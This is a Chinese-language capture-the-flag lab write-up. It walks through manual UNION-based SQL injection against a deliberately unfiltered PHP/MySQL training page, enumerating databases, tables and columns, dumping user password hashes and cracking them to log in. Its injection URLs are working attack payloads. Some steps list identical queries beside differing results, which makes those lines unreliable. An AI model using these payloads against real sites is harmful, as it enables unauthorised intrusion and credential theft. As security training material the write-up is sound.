# SQL 手工注入漏洞测试（MySQL数据库）

> **题目信息：**
> **背景介绍**
> 安全工程师"墨者"最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧
> **实训目标**
> 1.掌握SQL注入原理；
> 2.了解手工注入的方法；
> 3.了解MySQL的数据结构；
> 4.了解字符串的MD5加解密
> **解题方向**
> 手工进行SQL注入测试，获取管理密码登录。

# 一、进入靶场
本题要求为**SQL注入**，那么我们就先去寻找注入点而不是直接爆破用户名和密码。
![靶场](http://blog-img-figure.oss-cn-chengdu.aliyuncs.com/img/20200507211537307.png)

# 二、在公告处发现注入点
![发现注入点](http://blog-img-figure.oss-cn-chengdu.aliyuncs.com/img/20200507211957381.png)
# 三、确定注入格式
1. http://219.153.49.228:41317/new_list.php?id=1 and 1=1 >> **不报错，未过滤关键字**
2. http://219.153.49.228:41317/new_list.php?id=1 and 1=1 >> **报错，发现注入点**
# 四、确定字段数
1. `http://219.153.49.228:41317/new_list.php?id=1order by 1` >> **不报错**
2. `http://219.153.49.228:41317/new_list.php?id=1order by 2` >> **不报错**
3. `http://219.153.49.228:41317/new_list.php?id=1order by 3` >> **不报错**
4. `http://219.153.49.228:41317/new_list.php?id=1order by 4` >> **不报错**
5. `http://219.153.49.228:41317/new_list.php?id=1order by 5` >> **报错**

**确定字段数为4**
# 五、确定显示字段
- `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,2,3,4`
![确定](http://blog-img-figure.oss-cn-chengdu.aliyuncs.com/img/20200507213250756.png)
**确定显示字段为2和3。**
# 六、查询数据库名字和版本
- `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,database(),version(),4`
![在这里插入图片描述](http://blog-img-figure.oss-cn-chengdu.aliyuncs.com/img/20200507214804213.png)
**确定数据库名字为 *mozhe_Discuz_StormGroup* ，数据库版本为 *5.7.22-0ubuntu0.16.04.1* 。**
# 七、查询其它数据库名称
1. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 0,1` >> **information_schema**
2. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1` >> **mozhe_Discuz_StormGroup**
3. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 2,1` >> **mysql**
4. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 3,1` >> **performance_schema**
5. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 4,1` >> **sys**
# 八、查询数据库表名
1. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 0,1`>>**StormGroup_member**
2. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 1,1`>>**notice**
**根据表名我们可以发现，*StormGroup_member*这张表放的是用户信息，*notice*这张表中放的是公告信息**
# 九、查询表中字段名
1. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1`>>**id, int(11)**
2. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1`>>**name, varchar(20)**
3. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1`>>**password, varchar(255)**
4. `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1`>>**status, int(11)**
# 十、查询用户信息
- `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,concat(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1`>>**mozhe-356f589a7df439f6f744ff19bb8092c0-0**
- `http://219.153.49.228:41317/new_list.php?id=-1 union select 1,concat(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 1,1`>>**mozhe-e2391899875e16f7013173cd17524303-1**
**查询出了两条记录，发现密码长度都为32位，猜测应该是md5加密的，将密码放进[解密网站](https://www.cmd5.com/)进行解密，使用用户名和密码登陆网站**
# 十一、登陆成功

**下方就是我们需要提交的key了**![在这里插入图片描述](http://blog-img-figure.oss-cn-chengdu.aliyuncs.com/img/20200507223622466.png)